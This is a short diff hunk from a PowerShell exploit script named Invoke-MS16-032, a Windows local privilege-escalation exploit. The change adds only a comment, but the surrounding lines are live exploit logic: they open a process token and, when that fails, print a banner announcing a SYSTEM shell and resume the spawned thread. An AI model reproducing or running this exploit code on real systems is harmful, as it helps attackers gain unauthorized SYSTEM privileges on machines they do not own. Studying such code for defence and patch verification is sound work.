@@ -350,6 +350,7 @@ function Invoke-MS16-032 {
 			
 		$hTokenHandle = [IntPtr]::Zero
 		$CallResult = [Advapi32]::OpenProcessToken($ProcessInfo.hProcess, 0x28, [ref]$hTokenHandle)
+		# If we can't open the process token it's a SYSTEM shell!
 		if (!$CallResult) {
 			echo "[!] Holy handle leak Batman, we have a SYSTEM shell!!`n"
 			$CallResult = [Kernel32]::ResumeThread($ProcessInfo.hThread)
